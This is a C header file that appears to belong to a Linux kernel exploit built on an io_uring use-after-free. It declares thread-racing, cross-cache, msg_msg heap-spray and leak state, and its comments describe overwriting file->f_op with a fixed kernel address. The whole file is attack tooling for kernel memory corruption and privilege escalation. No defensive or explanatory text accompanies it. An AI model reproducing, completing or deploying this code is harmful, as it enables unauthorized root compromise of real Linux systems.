#ifndef MGR_H
#define MGR_H

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#include <limits.h>
#include <liburing.h>

#include "err_state.h"
#include "cross_cache.h"
#include "msg.h"
#include "tls.h"

/* Page allocator constants. */
#define OBJS_PER_SLAB (25)
#define CPU_PARTIAL (13)
#define OBJS_PER_PAGE (25)      // TO DO GET OBJS PER PAGE
#define PAGE_OFF (6)

/* We write this pointer to file->f_op so that f_op->flush == NULL.
 * This address and its contents are invariant across boots. */
#define NULL_MEM (0xfffffe0000002000)
#define DEAD_LIST_PATTERN (0xdead4ead00000000)
#define INF_TIME (ULONG_MAX)

/* How many timeout, link_timeout objects to create */
#define N_TIMEOUT_OBJS (16)
#define N_WAIT_CQES (10)

#define TIMEOUT (100000000)
#define TIMEOUT_SCALE (500)

struct manager {

    /* Collected statistics from the runtime */
    struct {
        // initial reallocation race stats
        uint32_t initial_race_fails;
        uint64_t last_success_sleep;
        // page offset / overwrite stats
        uint32_t overwrite_fails;
        uint64_t last_success_offset;
    };

    /* Dynamic configurations */
    struct {
        uint64_t sleep_before_tee;
    };

    /* Pipe descriptor stores */
    struct {
    #define RD (0)
    #define WR (1)
    #define N_PIPES (16)
        int pipes_in[N_PIPES][2];
        int pipes_out[N_PIPES][2];
    };

    /* IO_uring rings */
    struct {
        struct io_uring uaf_ring;
        struct io_uring tee_ring;
    };

    /* Thread identifiers */
    struct {
    #define N_TRIGGER_TH (4)
    #define N_CATCH_TH (4)
    #define N_WAIT_TH (1)
        pthread_t wait_cqe_th[N_WAIT_TH];
        pthread_t catch_th[N_CATCH_TH];
        pthread_t trigger_th[N_TRIGGER_TH];
    };

    /* Thread synchronisation */
    struct {
        pthread_cond_t uaf_cond;
        pthread_mutex_t uaf_mutex;
        bool threads_go;
    };

    /* Cross cache management object */
    struct cross_cache *cc;

    /* For the spray and leak */
    struct {
        int64_t msq_ids[TOTAL_MSGS];
        union {
            char spray[MSG_SIZE];
            char leak[MSG_SIZE];
        };
    };
};

err_t open_pipes(struct manager*, int);
err_t close_pipes(int pipes[][2]);

err_t start_threads(struct manager *, pthread_t*, void*, uint32_t);
err_t wait_threads(pthread_t*, uint32_t);
err_t wait_condition(pthread_mutex_t*, pthread_cond_t*, bool*);
err_t set_condition(pthread_mutex_t*, pthread_cond_t *, bool*);

void end_session(struct manager *);
err_t refresh_session(struct manager *);
struct manager* new_session();

#endif // MGR_H
